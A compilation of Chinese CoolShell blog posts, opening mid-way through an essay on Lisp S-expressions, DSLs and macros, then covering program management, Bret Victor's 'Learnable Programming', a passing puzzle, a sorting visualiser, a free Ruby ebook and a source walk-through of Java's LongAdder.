其次，我们可以用它来定义类：<class name="Computer">     <field access="private" type="MainBoard" name="main-board" />     <field access="private" type="CPU" name="cpu" />     <field access="private" type="Memory" name="memory" /><method access="public" return_type="boolean" name="powerOn" />     <params>...</params>     <body>...</body>     </method><method access="public" return_type="boolean" name="powerOff" />     <params>...</params>     <body>...</body>     </method>     </class>还可以轻易地用它来编写关系查询：<sql>     <select>     <column name="employees.id" />     <column name="bonus.amount" />     </select>     <from>     <table name="employees" />     <table name="bonus" />     </from>     <where>     <equals>     <column name="employees.id" />     <column name="bonus.employee_id" />     </equals>     </where>     </sql>
还可以用它来实现类似make file的自动化构建(语法取自ant)：<project name="MyProject" default="dist" basedir=".">     <property name="src" location="src"/>     <property name="build" location="build"/>     <property name="dist"  location="dist"/>一口气举了这么多个例子，目的在于用XML这种树形结构来说明Lisp的S表达式所能够描述的语义。不知道你是否发现了S表达式和XML这种树形语法在语义构造方面有着特别的“柔性”？我们可以轻易地用它构造出函数、变量、条件判断语义；类、属性、方法语义；可以轻易地构造出关系模型的select、where语义；可以轻易地构造出make的target、depends语义，等等数不清的语义。在普通语言里，你可以定义一个函数、一个类，但你无法为C语言增加匿名函数特性，也没法给Java语言加上RAII语义，甚至连自己创造一个foreach循环都不行，而自定义语义意味着在Lisp之上 **你创造了一门语言** ！不管是面向过程，面向对象，函数式，还是关系模型，在Lisp里统统都变成了一种DSL，而Lisp本身也就成了一种定义语言的语言，即元语言(Meta Language)。
Lisp的柔性与S表达式有着密切的关系。Lisp并不限制你用S表达式来表达什么语义，同样的S表达式语法可以表达各种不同领域的语义，这就是 **语法和语义解耦** 。如果说普通语言的刚性源于“语法和语义紧耦合”，那么Lisp的柔性正是源于“语法和语义解耦”！“语法和语义解耦”使得Lisp可以随意地构造各种领域的DSL，而不强制用某一种范式或是领域视角去分析和解决问题。本质上，Lisp编程是一种超越了普通编程范式的范式，这就是 **Lisp之道：面向语言编程(LOP, Language Oriented Programming)** 。Wikipedia上是这样描述LOP的：> Language oriented programming (LOP) is a style of computer programming in > which, rather than solving problems in general-purpose programming > languages, the programmer creates one or more domain-specific languages for > the problem first, and solves the problem in those languages … The concept > of Language Oriented Programming takes the approach to capture requirements > in the user’s terms, and then to try to create an implementation language as > isomorphic as possible to the user’s descriptions, so that the mapping > between requirements and implementation is as direct as possible.
LOP范式的基本思想是从问题出发，先创建一门描述领域模型的DSL，再用DSL去解决问题，它具有高度的声明性和抽象性。SQL、make file、CSS等DSL都可以被认为是LOP的具体实例，下面我们再通过两个常见的例子来理解LOP的优势。例1：在股票交易系统中，交易协议定义若干二进制的消息格式，交易所和客户端需要对消息进行编码和解码。消息格式是一种抽象的规范，本身不对语言做任何的限制，你可以用C，C++，Java，或者Python。普通的实现方式是按照消息格式规范，在相应的语言中定义消息结构，并编写相应的编解码函数。假设为一个消息定义结构和实现编解码函数的工作量为M，不同消息类型的数量为N，这种方式的工作量大致为M*N。也就是说每增加一种消息类型，就需要为该消息定义结构，实现编解码函数，引入bug的可能性当然也和M*N成正比。如果仔细观察不难发现，各个消息结构其实是高度类似的，编解码函数也大同小异，但是普通语言却找不到一种抽象机制能表达这种共性，比如，我们无法通过面向对象的方法定义一个基类把消息结构的共性抽象出来，然后让具体的消息去继承它，达到复用的目的。这正是由于普通语言的抽象维度限制所致，在普通语言中，你只能从函数、接口等维度对事物进行抽象，而恰好消息格式共性所在的维度与这些抽象维度并不匹配。
其实，不同消息类型的 **共性在于它们都具有相同的领域语义** ，比如：“某字段内容是另一个字段内容的md5码”就是一种消息格式的领域语义，这种领域语义是OOP的抽象机制无法描述的。LOP的思路是先创建一门消息定义DSL，比如，类似Google的Protocol Buffer，Android的AIDL。然后，通过DSL编写消息定义文件，直接声明式地描述消息的结构特征，比如，我们可以声明式地描述“某字段内容是另一个字段内容的md5码”。我们还需要为DSL开发编译器用于生成C、Java等通用语言的消息定义和编解码函数。有了消息定义DSL和编译器之后，由于DSL编写消息定义是一种高度声明式的编程方法，每增加一种消息的只需要多编写一个消息定义文件而已，工作量几乎可以忽略不计。所有的工作量都集中在编译器的开发上，工作量是一个常数C，与消息的数量没有关系；质量保证方面也只需要关注编译器这一点，不会因为增加新的消息类型而引入bug。例2：在图书管理系统中，需要支持在管理界面上对书籍、学生、班级等各种实体进行管理操作。如果按传统的三层架构，一般需要在后端程序中为每一种实体定义一个类，并定义相应的方法实现CRUD操作，与之相应的，还需要在前端页面中为每一个实体编写相应的管理页面。这些实体类的CRUD操作都是大同小异的，但细节又各不相同，虽然我们很想复用某些共同的设计实现，但OOP所提供的封装、继承、多态等抽象机制不足以有效捕获实体之间的共性，大量的代码还是必须放在子类中来完成。比如，Student和Book实体类的实现非常相似，但是如果要通过OOP的方式去抽象它们的共性，得出的结果多半是Entity这样的大而空的基类，很难起到复用的效果。
其实，不同实体之间的共性还是在于它们具有相同的领域语义，比如：实体具有属性，属性具有类型，属性具有取值范围，属性具有可读取、可编辑等访问属性，实体之间有关联关系等。LOP方法正是直接面向这种领域语义的。采用LOP方法，我们并不需要为每一个实体类单独编写CRUD方法，也不需要单独编写管理页面，只需要定义一种DSL并实现其编译器；然后，用DSL声明式地编写实体描述文件，去描述实体的属性列表，属性的类型、取值范围，属性所支持的操作，属性之间的关系和约束条件等；最后，通过这个实体描述文件自动生成后端的实体类和前端管理页面。采用LOP，不论前后端采用何种技术，Java也好，C#也好，JSP也好，ASP.NET也好，都可以自动生成它们的代码。采用LOP的工作量和质量都集中在DSL的设计和编译器的开发，与实体的数量无关，也就是说，越是庞大的系统，实体类越多越是能体现LOP的优势。通过上面两个小例子我们可以感受到，LOP是一种面向领域的，高度声明式的编程方式，它的抽象维度与领域模型的维度完全一致。LOP能让程序员从复杂的实现细节中解脱出来，把关注点集中在问题的本质上，从而提高编程的效率和质量。接下来的问题是如果需要为某领域设计DSL，我们是应该发明一门类似SQL这样的专用DSL呢，还是用XML或S表达式去定义DSL呢？它们各有何优缺点呢？
我认为采用XML或S表达式定义DSL的优点主要有：1) SQL、make file、CSS等专用DSL都只能面向各自的领域，而一个实际的领域问题通常是跨越多个领域的，有时我们需要将不同领域融合在一起，但是由于普通语言的刚性，多语言融合通常会是一件非常困难的事情，而XML和S表达式语法结构的单一性和“代码及数据”的特点使得跨领域融合毫无障碍。2) 在为DSL开发编译器或解释器的方面，二者难度不同。对XML和S表达式定义的DSL进行语法分析非常简单，相比之下，对SQL这样的专用DSL进行语法分析，虽然可以借助Lex、Yacc、ANTLR等代码生成工具，但总的来讲复杂度还是要明显高一些。当然，XML和S表达式的优点也正好是其缺点，由于XML和S表达式的语法形式是固定的，不能像专用DSL那样自由地设计语法。所以，一般来讲专用DSL的语法显得更加简洁。换句话说，XML和Lisp其实是在语法和语义间做了一个交换，用语法的限制换来了语义的灵活。#### Lisp之器接下来我们继续探讨DSL的解释执行问题。DSL代码的解释执行一般分为3种典型的方式：1) 通过专门的解释器解释执行；2) 编译生成其他语言的代码，再通过其他语言的解释器解释执行(或编译运行)；3) 自解释。比如，第1类的代表是SQL，上一节举的两个例子都属于第2类，而第3类自解释正是Lisp的特色。
为了理解自解释，我们可以先从内部DSL的解释执行说起。内部DSL是指嵌入在宿主语言中的DSL，比如，Google Test单元测试框架定义了一套基于流畅接口(Fluent Interface)的C++单元测试DSL。从语义构造的角度看，内部DSL直接借用宿主语言的语法定义了自己的领域语义，是一种语法和语义解耦；从解释执行的角度看，内部DSL是随宿主语言的解释器而自动解释的，不需要像外部DSL一样开发专门的解释器，因而实现的代价很低。当然，并不是说设计内部DSL不用关心任何的解释实现，实际上，还是需要熟悉宿主语言的特性，并利用该特性使得DSL能随着宿主语言的解释器得到解释执行。Lisp拥有强大的自解释特性，这得益于独一无二的 **Lisp之器：宏 (macro)** 。宏使得Lisp编写的DSL可以被Lisp解释器直接解释执行，这在原理上与内部DSL是相通的，只是内部DSL一般是利用宿主语言的链式调用等特性，通常形式简陋，功能有限，而Lisp的宏则要强大和灵活得多。C语言中也有宏的概念，不过Lisp的宏与C语言的宏完全不同，C语言的宏是简单的字符串替换。比如，下面的宏定义：#define square(x) (x*x)
square(1+1)的期望结果是4，而实际上它会被替换成(1+1*1+1)，结果是3。这个例子说明，C语言的宏只在预编译阶段进行简单的字符串替换，对程序语法结构缺乏理解，非常脆弱。Lisp的宏不是简单的字符串替换，而是一套完整的代码生成系统，它是在语法解析的基础上把Lisp代码从一种形式转换为另一种形式，本质上起到了普通语言编译器的作用。不同的是，普通编译器是把一种语言的代码转换为另一种语言的代码，比如，Java编译器把Java代码转换成Java字节码；而Lisp宏的输入和输出都是S表达式，它本质上是把一种DSL转换为另一种DSL。下面的例子是宏的一个典型用法。例3：假设Lisp解释器已经具备解释执行面向过程DSL的能力，需要实现类似ant的自动化构建工具。我们可以基于宏构建一门类ant的DSL，宏的作用是把类ant DSL通过宏展开变成面向过程的DSL，最后被Lisp解释器所解释执行。这样用Lisp编写的ant DSL就不需要被编译为其他语言，也不需要像XML的ant一样依赖于专门的解释器了。当然，和开发专门的解释器/编译器相比，Lisp的宏也并非没有缺点，宏难以理解，开发和调试更加困难。到底是开发专门的解释器/编译器还是直接采用宏应该视具体情况而定。
#### 总结Lisp采用单一的S表达式语法表达不同的语义，实现了语法和语义解耦。这使得Lisp具有强大的语义构造能力，擅长于构造DSL实现面向语言编程，而宏使得Lisp具有自解释能力，让不同DSL之间的转换游刃有余。进入Lisp的世界应当从理解面向语言编程入门，这是Lisp之道，而函数式编程和宏皆为Lisp之器，以道驭器方为正途。#### 后记本文是我学习Lisp的一个总结，也是写给有兴趣学习Lisp的程序员的入门资料。必须说明，我还是一个标准的Lisp初学者，几乎没有写过像样的Lisp程序，文中的错误和不足在所难免，希望读者批评指正，感谢！#### 参考The Roots of LispThe Nature of LispWhy Lisp macros are cool, a Perl perspectiveWikipedia: Language-oriented programming《实用Common Lisp编程》《冒号课堂 – 编程范式与OOP思想》# 怎样做一个 Program Manager作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
我个人认为，这是一篇不错的文章，虽然我不是Program Mananger，但是我几乎在做着和这个职位很相似的工作。在这里，我把这篇文章推荐给所有的程序员，我相信，这篇文章会让你明白，只有技术是远远不够的，因为没有Program Manager这个角色，程序员们只不过一些手中拿着利器却不知所措的散兵游勇。我希望我的导读和原文能给所有的程序带来启示。**原文在这里：**   “How to be a program manager”!09meeting-thumbnail这篇文章的作者叫Joel Spolsky，在Microsoft做过Program Manager，这篇文章非常值得一读。下面是我给大家做的一个导读：首先，他讲了两个人，一个是负责WYSIWYG 字处理的天才级的Program Manager——Charles Simonyi，第二个是上世纪80年代的负责Mac OS上的Excel项目的程序员Jabe Blumenthal，他发现了程序员和市场人员的代沟，Marketing的人很难通过把MBA- Speaking翻译成实际的Feature，并且，有太多的和编码不相关的工作，比如说，和用户交谈，运行usability测试，Reivew竞争者的产品，并且得冥思苦想怎么能让事情变得更简单，而我们的程序员通常来说即不具备这样的时间，也不具备这样的能力。于是，Jabe开始了他的Program Manager的生涯。
**工作范围**作者在第二节里说了一个PM主要负责哪些事务：1. Design UIs （用户界面的设计）   2. Write functional specs （书写功能规格说明书）   3. Coordinate teams （团队协调）   4. Serve as the customer advocate, and （从用户角度思考问题）   5. Wear Banana Republic chinos （Banana Republic是一个服装品牌，意思是作者在调侃PM需要衣冠楚楚，而不像程序员们只有T恤或牛仔裤）接下来，作者讲述了他第一份Program Manager工作的经历，非常有意思，那是一个关于Excel 用户定制化的项目（耗子注：应该是在Excel中加入VBScript的项目吧，就是所谓的宏）。第一个阶段* 首先，作者找了很多很多的用户谈论了这个什么是最有用最合理的实现，这是一个非常巨大的工作，花费了非常多的精力和时间。   * 然后，作者找到了Visual Basic团队询问了是否可能给Excel提供一个编译器和代码编辑器，以便实现“宏”。   * 接着，作者查看了一下Apple上面的AppleScript这种宏，取了取经。   * 最后，作者同 Word, Access, Project, 和Mail团队们讨论了很多很多。
作者说，这个阶段的工作让他满是伤痕，他甚至害怕听到手机铃响。第二个阶段* 确定大方向。他开始写下Visual Baisc应该怎么样在Excel里面工作的文档。并提供了一些简单的宏的样子。这应该是high-level的Functional Spec。   * 当大的方向确定后，他开始了一些更为细节的功能规格说明的书写。这就是所谓的Functional Specification. (耗子注：这份文档应该只是说明从用户的角度上来看这个产品长成什么样，而不是实现)   * 虽然FS并不需要说明怎么去实现，但这份文档应该是需要非常详细地说明整个Excel和VBScript怎么相互交互的，这是其中最重要的部分。   * 当作者把FS的一个初始化版本发给开发团队（Ben Waldman）时，开发团队非常快地实现出了一个原型，并提供了面向对象的相关接口。但可惜的是，那并不是Program Manger所想要的。   * 作者描述了一个细节如果帮助开发团队解决技术难点的例子。那是关于把一个Excel中的一个cell的值取出来的例子。当时，developer团队认为这是一个难点，因为这个值可能是任意类型的。而VB中却需要先声明变量的类型。后来，作者找到了VB的开发团队，了解到了Variants 和IDispatch可以做到这个。
我们可以看到，FS在这样反复地和developer 团队推敲，甚至去帮助程序员解决技术难题，之后最终才能确定下来。一旦FS确定后，program manger需要做两件事：1. 负责解释相关的问题。   2. 组织并形成相关的design。也就是说，除了对FS解释外，需还需要把What needs to do 变成 How to do的设计文档。另外，Program Manager可能会有下面的工作：* 测试人员会对FS有很多很多疑问，因为他们需要知道怎么样去测试这些FS中所包含的东西。   * 和文档团队商讨如何写一个好的教程或是一个参考文档。   * 和localization 团队制定localization 的策略。   * 和市场人员说明VBA的优势和功能。我们可以看到，作者有太多，太多的会议和太多的与人沟通的事务，真是一个不简单的工作啊。**冲突管理**后面，作者着重讲了“Conflicts”冲突，这可能是所有的团队都会有的问题。而我们的Program Manager因为要和那么多的人沟通交流，所以，必然会需要有一种超人的能力去管理与人的发生的观点上的冲突。作者，在这里说了和程序员发生的很多争论，因为Program Manager是从用户的角度出发，而我们程序员总是从技术和实现的角度出发，不同的角度必然会引发冲突。作者举了一个例子，他说，用户们喜欢一个“心灵感应”的界面和一个30英寸的显示器，而我们的程序员喜欢的只是用Python搞的命令行接口。呵呵。另外，作者引用了一个Excel中的“pivot tables ”所引发的一个历时最长的争议作为案例。
最后，作者讨论了，争论是一个很好的事，就好像法院里的原告和被告都有自己的辩护律师一样，这有助于人们逼近事物的真相。对于软件开发也一样，良好的争论其实是对产品有好处的。我们应该在争论中关注事。当在讨论到和程序相处的过程，作者说到了和程序员相外并不是一件很容易的事，因为你并不编码而也没有技术能力，通常会受到程序员的冷眼。所以在和程序沟通的过程中需要保证两件事：1）确信自己的正确的。2）让程序员尊敬自己。而对于第二点，如何让程序员尊敬自己，作者发表了自己的见解：1）demonstrate intelligence（展示自己的才华），2）open- mindedness（心胸宽阔），3）fairness（公平，正直）。千万不要搞办公室政治，或是开私密的经理会，等等。不然的话，你必然受到排挤。**推荐读物**最后作者给大家推荐了一些很不错的读物：* Making Things Happen （经理一般都在干什么？）   * Don’t Make Me Think （如果你要写FS或UI设计，你应该看看这本书）   * User Interface Design for Programmers. （作者自己的书，关于UI设计）   * How to Win Friends & Influence People （在人际关系方面，需要看看这本书）
（完）# Bret Victor – Learnable Programming作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn大家是否还记得之前酷壳向大家介绍的苹果设计师Bret Victor一种可视编程的视频《Bret Victor – Inventing on Principle》，最近，他写了一篇文章—— Learnable Programming，写这篇文章的原因是因为“可汗学院(Khan Academy)”近期上线的一个在线编程环境，根据他的演讲提供了一堆基于Javascript的“实时编程”的环境，因为这个环境是引用了他的想法，所以，他有必要出来喷两句。这篇文章的开头就是一个问题——“ _How do we get people to understand programming?_ ”，我们怎么让人们懂得编程？然后，他说了两条——* **编程是一种思考，而不是一种死记硬背的技能！** 你学会了“for循环”并不是说你就学会了编程，这就好像你知道有铅笔这个东西，但是你对绘画还是什么不懂。（对于这一条，正好这两天我在微博上和人辩论“基础算法面试题是否好”（还有微博一，微博二），而且我以前也写过一篇《为什么我反对纯算法面试》，这里借用Bret的话再加强一下我的观点——“ **我们一方面在骂中国的应试教育毁了学生，另一方面我们又在把我们的面试变成“考八股文”式的考试！ 你会qsort有什么用？你只不过是会用一支高级铅笔而已罢了。** ”）
* **人只有看得见，才能理解。** 如果一个程序员不能看到他的程序在干什么，那么她就不能理解程序。（对于这一条，让我想到了Donald Knuth的话——“An algorithm must be seen to be believe!”）所以，Bret 觉得编程软件的目标是——* 支持并激发强大的思考。 To support and encourage powerful ways of thinking.   * 让程序员可以看得见程序的运行过程。To enable programmers to see and understand the execution of their programs他说，可汗学院的“实时编程环境”并没有达到上面的任何一个目标。他还说用Javascript这样设计得很垃圾的语言根本不能支持强大的思考，而且还忽略了近十年来的成果，可汗学院这些东西完全是毫无价值的。Bret认为，Alan Perlis的名言——“要学会编程，你必需得同时变成机器和程序”是错误的，这句被广为流传的错误名言，让我们把编程变成很难，并且掩盖了编程的艺术。人并不是一台机器，我们也不应该强迫自己变成那样。
接下来，他说明了一个编程系统应该有两个部分——* **编程的“环境”，是其中一部分需要安装在电脑上的。*** **编程的“语言”，是另一部分需要安装在程序员大脑里的。**他随笔给出来了一些Design Principles——对于“ **编程环境** ”，应该能让学习者干下面的事：* **阅读程序词汇 read the vocabulary** _—_ 这些单词意味着什么？是不是显而易见不用思考的？是不是很自然地被上下文解释了？* **跟进流程 follow the flow** _—_ 在什么时候会发生什么？流程的时间过程是不是看得见摸得着的？流程的粒度是否有意义？* **看见状态 see the state** _—_ 电脑在想些什么？你能不能看到电脑里的数据？并可以看到不同状态的比较？没有任何状态会隐藏？* **通过交互来创造代码 create by reacting** _—_ 从粗糙开始，然后开始雕琢程序。交互是否实时显示在屏幕上？有多少组件我可以用来做实时交互？* **通过抽像来创造代码 create by abstracting** _—_ 从一些hard code开始，然后开始抽象成变量 _，_ 抽象成公式，抽象成函数。从一个开始作模板，然后做多个不同的东西。
对于“ **编程语言** ” 来说，它应该提供下面的事：* **同一性和比方 identity and metaphor** _—_ 我怎么把电脑的世界和我的世界联系起来? __ 推荐了一本书《 _“Mindstorms”_ 》* **分解 decomposition** _—_ 怎么把我的想法分解成碎片？ _how do I break down my thoughts into mind-sized pieces?_   * **重组 recomposition** _—_ 怎么把这些碎片重组起来？ _how do I glue pieces together?_   * **可读性 readability** _—_ 这一大堆程序单词是什么意思？ _what do these words mean?_然后，他说“The Features are not the point”， **我们很多时候会关注编程环境和编程语言提供的功能，这就好像我们在看一本书有哪些单词一样，有哪些单词不重要，重要的是我这些单词组合起来传达了一个什么信息** ？ **一个设计的好的系统并不是一堆功能，一个设计得好的编程环境是激发特定的思考方式** 。所有的功能都是非常小心翼翼地组合起来为之服务。（不好意思，我又要插一句。我觉得这和我在《抄袭，腾讯和产品》一文中，我所理解的“什么是真正的产品”有点类似——真正的产品不是功能的组合，而是要表达的价值和对某一特定问题端到端的解决方案）
接下来，Bret用大量的示例告诉了大家上面所说的那几条是具体是什么。大家一定要去读一读！（我把这些东西总结果在上面的那些条目中了）最后，Bret说了一下，他被问过很多次——这些漂亮的想法怎么应用到现实世界中？他说这个问题问的是对的，但是这些问题问的就好像是——“怎么能让一匹马从内燃机引擎受益”一样，其假设的改变是错误的。他回答到，更准确的是——“ **Programming has to work like this** ”，所以他说，他的这些东西不是一种“Training”，也不是一种“银弹”，只不过是拿开了眼罩。**更新：** 一楼回复的朋友给了一个中译版的链接：(全文完)# 【问题】传球问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn有a,b,c,d,四个人   互相传球   从a开始传出   经过5次传球后   球回到a的手里算总共有多少种传球的方法# Error handling in Egypt作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前发布过《C语言的错误处理》一文，不过今天想说的是Egypt的“错误处理”。埃及的事闹得挺大的，国外和中文twitter上更是炸了锅。不要以为程序员就只会写程序——看看程序员举出来的标语吧。呵呵。
Error handling in Egypt当然，作为程序员来说，这段代码显然还需要重构：也有的程序员说，System.err.println不是处理错误的最好方法，正确的方法应该是：最后，我们希望Egypt不要出现：# 可视化的排序过程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一个日本程序员制做的一个可视化的排序过程，包括了各种经典的排序算法，你可以调整速度和需要排序的个数。酷壳以前也介绍过几篇相关的文章 一个排序算法比较的网站，一个显示排序过程的Python脚本 关于各种排序算法的运行复杂度比较，请参看Wikipedia的排序算法比较。# 免费电子书：Ruby Complete作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这是一本免费的关于教你如何使用Ruby编程的电子书。作者：Huw Collingbourne， SapphireSteel Software 公司的Technology Directory，他也是一个开发 Visual Studio下的Ruby Steel IDE的程序员。这本书给大家提供非常全面的教程，其涵养了几乎所有主要的Ruby编程的东西。
每一章的代码都可以被下载。如果你是一个 Ruby In Steel 的用户，那么，你可以在一个单一的Visual Studio solution 中载入这些代码，并可以在集成的 Ruby Console 上运行这些代码，并调试之。下面这是这本书的一些特性：* 425 页。   * 20 章节。   * 超过 84,000 个词。   * 超过300 个可以运行的示例代码。   * 100% 的免费!下载这本书和其所有的源码 ( _大小2.9MB_ )# 从LongAdder看更高效的无锁实现作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢@jd刘锟洋 投稿，更多文章参看他的博客：码梦为生）****原文链接** ：《比AtomicLong还高效的LongAdder 源码解析》接触到AtomicLong的原因是在看guava的LoadingCache相关代码时，关于LoadingCache，其实思路也非常简单清晰：用模板模式解决了缓存不命中时获取数据的逻辑，这个思路我早前也正好在项目中使用到。言归正传，为什么说LongAdder引起了我的注意，原因有二：
1. 作者是Doug lea ，地位实在举足轻重。   2. 他说这个比AtomicLong高效。我们知道，AtomicLong已经是非常好的解决方案了，涉及并发的地方都是使用CAS操作，在硬件层次上去做 compare and set操作。效率非常高。因此，我决定研究下，为什么LongAdder比AtomicLong高效。首先，看LongAdder的继承树：!la1继承自Striped64，这个类包装了一些很重要的内部类和操作。稍候会看到。**正式开始前，强调下，我们知道，AtomicLong的实现方式是内部有个value 变量，当多线程并发自增，自减时，均通过CAS 指令从机器指令级别操作保证并发的原子性。**再看看LongAdder的方法：!la2   怪不得可以和AtomicLong作比较，连API都这么像。我们随便挑一个API入手分析，这个API通了，其他API都大同小异，因此，我选择了add这个方法。事实上,其他API也都依赖这个方法。!la3   LongAdder中包含了一个Cell 数组，Cell是Striped64的一个内部类，顾名思义，Cell 代表了一个最小单元，这个单元有什么用，稍候会说道。先看定义：
!la4   Cell内部有一个非常重要的value变量，并且提供了一个CAS更新其值的方法。回到add方法：!la3这里，我有个疑问，AtomicLong已经使用CAS指令，非常高效了（比起各种锁），LongAdder如果还是用CAS指令更新值，怎么可能比AtomicLong高效了？ 何况内部还这么多判断！！！这是我开始时最大的疑问，所以，我猜想，难道有比CAS指令更高效的方式出现了？ 带着这个疑问，继续。第一if 判断，第一次调用的时候cells数组肯定为null,因此，进入casBase方法：!la5   原子更新base没啥好说的，如果更新成功，本地调用开始返回，否则进入分支内部。什么时候会更新失败？ 没错，并发的时候，好戏开始了，AtomicLong的处理方式是死循环尝试更新，直到成功才返回，而LongAdder则是进入这个分支。分支内部，通过一个Threadlocal变量threadHashCode 获取一个HashCode对象，该HashCode对象依然是Striped64类的内部类，看定义：!la6   有个code变量，保存了一个非0的随机数随机值。回到add方法：!la3
拿到该线程相关的HashCode对象后，获取它的code变量，as[(n-1)&h] 这句话相当于对h取模，只不过比起取模，因为是 与 的运算所以效率更高。计算出一个在Cells 数组中当先线程的HashCode对应的 索引位置，并将该位置的Cell 对象拿出来用CAS更新它的value值。当然，如果as 为null 并且更新失败，才会进入retryUpdate方法。看到这里我想应该有很多人明白为什么LongAdder会比AtomicLong更高效了，没错，唯一会制约AtomicLong高效的原因是高并发，高并发意味着CAS的失败几率更高， 重试次数更多，越多线程重试，CAS失败几率又越高，变成恶性循环，AtomicLong效率降低。 那怎么解决？ **LongAdder给了我们一个非常容易想到的解决方案：减少并发，将单一value的更新压力分担到多个value中去，降低单个value的 “热度”，分段更新！！！**这样，线程数再多也会分担到多个value上去更新，只需要增加value就可以降低 value的 “热度” AtomicLong中的 恶性循环不就解决了吗？ cells 就是这个 “段” cell中的value 就是存放更新值的， 这样， **当我需要总数时，把cells 中的value都累加一下不就可以了么！！**
**当然，聪明之处远远不仅仅这里，在看看add方法中的代码，casBase方法可不可以不要，直接分段更新,上来就计算 索引位置，然后更新value？**答案是不好，不是不行，因为，casBase操作等价于AtomicLong中的CAS操作，要知道，LongAdder这样的处理方式是有坏处的，分段操作必然带来空间上的浪费，可以空间换时间，但是， **能不换就不换，看空间时间都节约~！** 所以， **casBase操作保证了在低并发时，不会立即进入分支做分段更新操作** ，因为低并发时，casBase操作基本都会成功，只有并发高到一定程度了，才会进入分支，所以，Doug Lea对该类的说明是： **低并发时LongAdder和AtomicLong性能差不多，高并发时LongAdder更高效！**!la7但是，Doung Lea 还是没这么简单，聪明之处还没有结束……如此，retryUpdate中做了什么事，也基本略知一二了，因为cell中的value都更新失败(说明该索引到这个cell的线程也很多，并发也很高时) 或者cells数组为空时才会调用retryUpdate,因此， **retryUpdate里面应该会做两件事：**
1. **扩容，将cells数组扩大** ，降低每个cell的并发量，同样，这也意味着cells数组的rehash动作。   2. **给空的cells变量赋一个新的Cell数组** 。是不是这样呢？ 继续看代码：代码比较长，变成文本看看，为了方便大家看if else 分支，对应的 { } 我用相同的颜色标注出来。可以看到，这个时候Doug Lea才愿意使用死循环保证更新成功~！final void retryUpdate(long x, HashCode hc, boolean wasUncontended) {     int h = hc.code;     boolean collide = false;                // True if last slot nonempty     for (;;) {     Cell[] as; Cell a; int n; long v;     if ((as = cells) != null && (n = as.length) > 0) {// 分支1     if ((a = as[(n - 1) & h]) == null) {     if (busy == 0) {            // Try to attach new Cell     Cell r = new Cell(x);   // Optimistically create     if (busy == 0 && casBusy()) {     boolean created = false;     try {               // Recheck under lock     Cell[] rs; int m, j;     if ((rs = cells) != null &&     (m = rs.length) > 0 &&     rs[j = (m - 1) & h] == null) {     rs[j] = r;     created = true;     }     } finally {     busy = 0;     }     if (created)     break;     continue;           // Slot is now non-empty     }     }     collide = false;     }     else if (!wasUncontended)       // CAS already known to fail     wasUncontended = true;      // Continue after rehash     else if (a.cas(v = a.value, fn(v, x)))     break;     else if (n >= NCPU || cells != as)     collide = false;            // At max size or stale     else if (!collide)     collide = true;     else if (busy == 0 && casBusy()) {     try {     if (cells == as) {      // Expand table unless stale     Cell[] rs = new Cell[n << 1];     for (int i = 0; i < n; ++i)     rs[i] = as[i];     cells = rs;     }     } finally {     busy = 0;     }     collide = false;     continue;                   // Retry with expanded table     }     h ^= h << 13;                   // Rehash  h ^= h >>> 17;     h ^= h << 5;     }     else if (busy == 0 && cells == as && casBusy()) {//分支2     boolean init = false;     try {                           // Initialize table     if (cells == as) {     Cell[] rs = new Cell[2];     rs[h & 1] = new Cell(x);     cells = rs;     init = true;     }     } finally {     busy = 0;     }     if (init)     break;     }     else if (casBase(v = base, fn(v, x)))     break;                          // Fall back on using base     }     hc.code = h;                            // Record index for next time     }
分支2中，为cells为空的情况，需要new 一个Cell数组。分支1分支中，略复杂一点点：注意，几个分支中都提到了busy这个方法，这个可以理解为一个CAS实现的锁，只有在需要更新cells数组的时候才会更新该值为1，如果更新失败，则说明当前有线程在更新cells数组，当前线程需要等待。重试。回到分支1中，这里首先判断当前cells数组中的索引位置的cell元素是否为空，如果为空，则添加一个cell到数组中。否则更新 标示冲突的标志位wasUncontended 为 true ，重试。否则，再次更新cell中的value,如果失败，重试。。。。。。。。一系列的判断后，如果还是失败，下下下策，reHash,直接将cells数组扩容一倍，并更新当前线程的hash值，保证下次更新能尽可能成功。**可以看到，LongAdder确实用了很多心思减少并发量，并且，每一步都是在”没有更好的办法“的时候才会选择更大开销的操作，从而尽可能的用最最简单的办法去完成操作。追求简单，但是绝对不粗暴。**——————— **陈皓注————————**最后留给大家思考的两个问题：1）是不是AtomicLong可以被废了？
2）如果cell被创建后，原来的casBase就不走了，会不会性能更差？———————liuinsect **注————————**昨天和左耳朵耗子简单讨论了下，发现左耳朵耗子,耗哥对读者思维的引导还是非常不错的，在第一次发现这个类后，对里面的实现又提出了更多的问题，引导大家思考，值得学习。我们 发现的问题有这么几个（包括以上的问题），自己简单总结下，欢迎大家讨论：1\. jdk 1.7中是不是有这个类？   我确认后，结果如下： jdk-7u51 版本上还没有 但是jdk-8u20版本上已经有了。代码基本一样 ，增加了对double类型的支持和删除了一些冗余的代码。有兴趣的同学可以去下载下JDK 1.8看看2\. base有没有参与汇总？   base在调用intValue等方法的时候是会汇总的：!LA103\. 如果cell被创建后，原来的casBase就不走了，会不会性能更差？ base的顺序可不可以调换?   刚开始我想可不可以调换add方法中的判断顺序，比如，先做casBase的判断？ 仔细思考后认为还是 不调换可能更好，调换后每次都要CAS一下，在高并发时，失败几率非常高，并且是恶性循环，比起一次判断，后者的开销明显小很多，还没有副作用（上一个问题，base变量在sum时base是会被统计的，并不会丢掉base的值）。因此，不调换可能会更好。
